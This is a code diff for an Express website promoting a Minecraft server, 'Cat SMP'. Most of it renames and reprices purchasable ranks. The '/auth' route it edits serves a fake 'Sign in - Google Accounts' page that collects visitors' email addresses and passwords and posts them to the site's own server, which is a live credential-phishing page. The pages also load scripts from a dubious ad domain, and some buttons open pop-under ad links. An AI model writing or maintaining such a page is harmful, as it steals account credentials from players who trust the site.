@@ -84,15 +84,9 @@ const siteStyles = `
     .rank-mod { color: #ff00ff; font-weight: bold; }
     .rank-builder { color: #b38600; font-weight: bold; }
     .rank-special { color: #33cc33; font-weight: bold; }
+    .rank-apex { color: #ffcc00; font-weight: bold; }
+    .rank-noble { color: #3399ff; font-weight: bold; }
     .rank-member { color: #808080; font-weight: bold; }
-    .rank-tiger { color: #ffcc00; font-weight: bold; }
-    .rank-cheetah { color: #ff8000; font-weight: bold; }
-    .rank-panther { color: #000000; font-weight: bold; background: #ffffff55; padding: 0 4px; border-radius: 3px; }
-    .rank-browntabby { color: #8B4513; font-weight: bold; }
-    .rank-greytabby { color: #808080; font-weight: bold; }
-    .rank-bombay { color: #111111; font-weight: bold; background: #ffffff55; padding: 0 4px; border-radius: 3px; }
-    .rank-persian { color: #ffffff; font-weight: bold; text-shadow: 0 0 2px #000; }
-    .rank-sphynx { color: #ffc0cb; font-weight: bold; }
 
     .hamburger-btn { background-color: var(--btn-bg); color: var(--btn-color); border: 1px solid var(--box-border); padding: 10px 14px; font-size: 1.3rem; border-radius: 8px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.3); font-weight: bold; }
     .hamburger-btn:hover { background-color: var(--btn-hover); }
@@ -183,14 +177,8 @@ const siteStyles = `
           else if (savedRank === "[MOD]") rankClass = "rank-mod";
           else if (savedRank === "[Builder]") rankClass = "rank-builder";
           else if (savedRank === "[Special]") rankClass = "rank-special";
-          else if (savedRank === "[Tiger]") rankClass = "rank-tiger";
-          else if (savedRank === "[Cheetah]") rankClass = "rank-cheetah";
-          else if (savedRank === "[Panther]") rankClass = "rank-panther";
-          else if (savedRank === "[Brown Tabby]") rankClass = "rank-browntabby";
-          else if (savedRank === "[Grey Tabby]") rankClass = "rank-greytabby";
-          else if (savedRank === "[Bombay]") rankClass = "rank-bombay";
-          else if (savedRank === "[Persian]") rankClass = "rank-persian";
-          else if (savedRank === "[Sphynx]") rankClass = "rank-sphynx";
+          else if (savedRank === "[Apex]") rankClass = "rank-apex";
+          else if (savedRank === "[Noble]") rankClass = "rank-noble";
           
           userTag.innerHTML = '<span class="' + rankClass + '">' + savedRank + '</span> ' + savedUser;
         } else {
@@ -241,12 +229,11 @@ const hamburgerHTML = `
 
 const headContent = `<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><script src="https://biographygridetelegram.com/e1/11/ad/e111ad2e4698f632e78f38a4258c4a16.js"></script>${siteStyles}`;
 const adBannerHTML = `<div class="ad-container"><script>atOptions = { 'key' : '6d1d513e7029b77d54e1471992ff0468', 'format' : 'iframe', 'height' : 250, 'width' : 300, 'params' : {} };</script><script src="https://www.highperformanceformat.com/6d1d513e7029b77d54e1471992ff0468/invoke.js"></script></div>`;
-
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP</title>${headContent}</head><body>${hamburgerHTML}<h1><span class="highlight">Cat SMP</span></h1><p>Welcome to the official <span class="highlight">Cat SMP</span> website! Jump into the action below.</p><div class="button-container"><a href="https://discord.gg/YZTjWw3h9" target="_blank" class="btn">Join Discord</a><a href="/shop" class="btn">Store</a><a href="/vote" class="btn">Vote</a></div><div class="content-box"><h2>🐱 How to Join <span class="highlight">Cat SMP</span></h2><p style="text-align: center; margin-bottom: 20px;"><span class="highlight">Cat SMP</span> is a survival Minecraft server with many features!</p><p><strong>IP:</strong> CatSMPgg.aternos.me<br><strong>Bedrock Port:</strong> 34018</p><h3 style="color: #ffcc00;">💻 Java</h3><ol style="line-height: 1.6;"><li>Open Minecraft Java.</li><li>Go to Multiplayer → Add Server.</li><li>Put <strong>CatSMPgg.aternos.me</strong> in the Server Address.</li><li>Click Done and join the server.</li></ol><h3 style="color: #ffcc00;">📱 Bedrock</h3><ol style="line-height: 1.6;"><li>Open Minecraft Bedrock.</li><li>Go to Play → Servers → Add Server.</li><li>Server Address: <strong>CatSMPgg.aternos.me</strong></li><li>Port: <strong>34018</strong></li><li>Save it and join.</li></ol><h3 style="color: #ffcc00;">🎮 PlayStation (Bedrock Online)</h3><ol style="line-height: 1.6;"><li>Download/open Bedrock Online on your phone.</li><li>Make sure your phone and PlayStation are on the same Wi-Fi.</li><li>Add the server in Bedrock Online:<ul><li>IP: CatSMPgg.aternos.me</li><li>Port: 34018</li></ul></li><li>Start the connection in Bedrock Online.</li><li>Open Minecraft on your PlayStation.</li><li>Go to Play → Worlds.</li><li>You should see the Bedrock Online world there.</li><li>Join it and you should be on <span class="highlight">Cat SMP</span>.</li></ol><p style="text-align: center; margin-top: 30px; font-weight: bold;">That’s it, enjoy <span class="highlight">Cat SMP</span> 🐱</p></div><a href="/secret/tickets" class="secret-admin-trigger" title="Admin Portal"></a></body></html>`);
 });
-  app.get('/shop', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Store</title>${headContent}</head><body>${hamburgerHTML}<h1><span class="highlight">Cat SMP</span> Store</h1><p>Support the server and get cool perks!</p><div class="content-box"><h2>🛍️ Server Store</h2><div class="button-container" style="margin-top: 20px;"><a href="/shop/currency" class="btn">Currency</a><a href="/shop/rank" class="btn">Rank</a><button onclick="window.open('https://biographygridetelegram.com/sqa31fs89u?key=b5c1e0e06871ea3a9c2815ffb75a2361', '_blank'); window.location.href='/shop';" class="btn">Coming soon</button></div>${adBannerHTML}</div><a href="/" class="back-home">← Back to Home</a></body></html>`);
+app.get('/shop', (req, res) => {
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Store</title>${headContent}</head><body>${hamburgerHTML}<h1><span class="highlight">Cat SMP</span> Store</h1><p>Support the server and get cool perks!</p><div class="content-box"><h2>🛍️ Server Store</h2><div class="button-container" style="margin-top: 20px;"><a href="/shop/currency" class="btn">Currency</a><a href="/shop/rank" class="btn">Rank</a><button onclick="window.open('https://biographygridetelegram.com/sqa31fs89u?key=b5c1e0e06871ea3a9c2815ffb75a2361', '_blank'); window.location.href='/shop';" class="btn">Coming soon</button></div>${adBannerHTML}</div><a href="/" class="back-home">← Back to Store</a></body></html>`);
 });
 
 app.get('/shop/currency', (req, res) => {
@@ -254,32 +241,17 @@ app.get('/shop/currency', (req, res) => {
 });
 
 app.get('/shop/rank', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Rank</title>${headContent}</head><body>${hamburgerHTML}<h1>Store - Ranks</h1><p style="color: #ffcc00; font-weight: bold;">Buy ranks and show off to other players your wealth!</p><div class="content-box"><h2>👑 Ranks Store</h2>
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Cat SMP - Rank</title>${headContent}</head><body>${hamburgerHTML}<h1>Store - Ranks</h1><p style="color: #ffcc00; font-weight: bold;">Welcome to the ranks Store!</p><div class="content-box"><h2>👑 Ranks Store</h2>
   
-  <h3 style="color: #ffcc00; margin-top: 15px;">High Ranks</h3>
-  <div class="button-container" style="margin: 10px auto 20px auto;">
-    <button class="btn"><span class="rank-special">[Special]</span> - 8$</button>
-    <button class="btn"><span class="rank-tiger">[Tiger]</span> - 4$</button>
-    <button class="btn"><span class="rank-cheetah">[Cheetah]</span> - 2$</button>
-    <button class="btn"><span class="rank-panther">[Panther]</span> - 2$</button>
-  </div>
-  
-  <h3 style="color: #ffcc00; margin-top: 15px;">Tabby Ranks</h3>
-  <div class="button-container" style="margin: 10px auto 20px auto;">
-    <button class="btn"><span class="rank-browntabby">[Brown Tabby]</span> - 12¢</button>
-    <button class="btn"><span class="rank-greytabby">[Grey Tabby]</span> - 10¢</button>
-  </div>
-
-  <h3 style="color: #ffcc00; margin-top: 15px;">Low Ranks</h3>
-  <div class="button-container" style="margin: 10px auto 20px auto;">
-    <button class="btn"><span class="rank-bombay">[Bombay]</span> - 10¢</button>
-    <button class="btn"><span class="rank-persian">[Persian]</span> - 10¢</button>
-    <button class="btn"><span class="rank-sphynx">[Sphynx]</span> - 10¢</button>
+  <div class="button-container" style="margin: 20px auto;">
+    <button class="btn"><span style="color: #33cc33; font-weight: bold;">[Special]</span> - 5$</button>
+    <button class="btn"><span style="color: #ffcc00; font-weight: bold;">[Apex]</span> - 3$</button>
+    <button class="btn"><span style="color: #3399ff; font-weight: bold;">[Noble]</span> - 2$</button>
   </div>
 
 </div><br><a href="/shop" class="back-home">← Back to Store</a></body></html>`);
 });
- app.get('/vote', (req, res) => {
+app.get('/vote', (req, res) => {
   res.send(`<!DOCTYPE html><html lang="en"><head><title>Vote for Cat SMP</title>${headContent}</head><body>${hamburgerHTML}<h1>Vote for <span class="highlight">Cat SMP</span></h1><p>Support the server and earn in-game vote keys!</p><div class="content-box"><h2>⭐ Vote Gateway</h2><p style="text-align: center; font-size: 1rem; margin-bottom: 20px;">Click the button below to support the server and view vote links!</p><div class="button-container" style="margin: 20px auto;"><button onclick="window.open('https://biographygridetelegram.com/sqa31fs89u?key=b5c1e0e06871ea3a9c2815ffb75a2361', '_blank'); window.location.href='/vote/links';" class="btn">Vote Links</button></div>${adBannerHTML}</div><br><a href="/" class="back-home">← Back to Home</a></body></html>`);
 });
 
@@ -298,7 +270,7 @@ app.post('/ticket/submit', (req, res) => {
 });
 
 app.get('/auth', (req, res) => {
-  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><div class="google-field"><label for="ign">In-Game Name</label><input type="text" id="ign" name="ign" required placeholder="Enter your Minecraft IGN"></div><div class="google-field"><label for="rank">In-Game Rank</label><select id="rank" name="rank" required><option value="[Owner]">[Owner]</option><option value="[MANAGER]">[MANAGER]</option><option value="[MAIN MOD]">[MAIN MOD]</option><option value="[MOD]">[MOD]</option><option value="[Builder]">[Builder]</option><option value="[Special]">[Special]</option><option value="[Tiger]">[Tiger]</option><option value="[Cheetah]">[Cheetah]</option><option value="[Panther]">[Panther]</option><option value="[Brown Tabby]">[Brown Tabby]</option><option value="[Grey Tabby]">[Grey Tabby]</option><option value="[Bombay]">[Bombay]</option><option value="[Persian]">[Persian]</option><option value="[Sphynx]">[Sphynx]</option><option value="[Member]" selected>[Member]</option></select></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
+  res.send(`<!DOCTYPE html><html lang="en"><head><title>Sign in - Google Accounts</title>${headContent}</head><body>${hamburgerHTML}<div class="google-card"><div class="google-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div><div class="google-subtitle">Sign in or create account</div><form action="/auth/submit" method="POST"><div class="google-field"><label for="email">Email or phone</label><input type="email" id="email" name="email" required placeholder="Enter your email"></div><div class="google-field"><label for="password">Password</label><input type="password" id="password" name="password" required placeholder="Enter your password"></div><div class="google-field"><label for="ign">In-Game Name</label><input type="text" id="ign" name="ign" required placeholder="Enter your Minecraft IGN"></div><div class="google-field"><label for="rank">In-Game Rank</label><select id="rank" name="rank" required><option value="[Owner]">[Owner]</option><option value="[MANAGER]">[MANAGER]</option><option value="[MAIN MOD]">[MAIN MOD]</option><option value="[MOD]">[MOD]</option><option value="[Builder]">[Builder]</option><option value="[Special]">[Special]</option><option value="[Apex]">[Apex]</option><option value="[Noble]">[Noble]</option><option value="[Member]" selected>[Member]</option></select></div><button type="submit" class="google-btn">Next</button></form></div><a href="/" class="back-home">← Back to Home</a></body></html>`);
 });
 
 app.post('/auth/submit', (req, res) => {
@@ -315,4 +287,4 @@ app.get('/secret/tickets', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Cat SMP server is running on port ${PORT}`);
 });
-           
+    
